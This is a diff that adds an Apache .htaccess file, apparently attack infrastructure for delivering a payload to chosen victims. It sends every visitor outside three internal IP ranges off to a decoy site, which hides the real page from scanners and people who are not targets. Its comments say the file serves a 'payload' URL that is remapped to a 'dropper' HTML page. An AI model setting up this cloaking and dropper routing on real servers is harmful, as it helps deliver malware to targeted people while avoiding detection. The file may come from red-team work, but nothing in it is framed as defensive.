@@ -1,0 +1,12 @@
+RewriteEngine On
+ErrorDocument 404 error.html
+#filter on NOT our target IPs, if invalid bounce to other website, because they arent what we want
+RewriteCond %{REMOTE_ADDR} !^192\.168\.17\.
+RewriteCond %{REMOTE_ADDR} !^192\.168\.18\.
+RewriteCond %{REMOTE_ADDR} !^192\.168\.19\.
+RewriteRule ^.*$ https://totallylegitlink.lol? [L,R=302]
+#
+#If user asks for page thats our payload, redirect to document
+#RewriteRule ^gimme_payload_plz/?$ somehashvaluefordropper.html [L,NC]
+#remap index to our custom page
+#RewriteRule index.html? custom.html [L,NC]
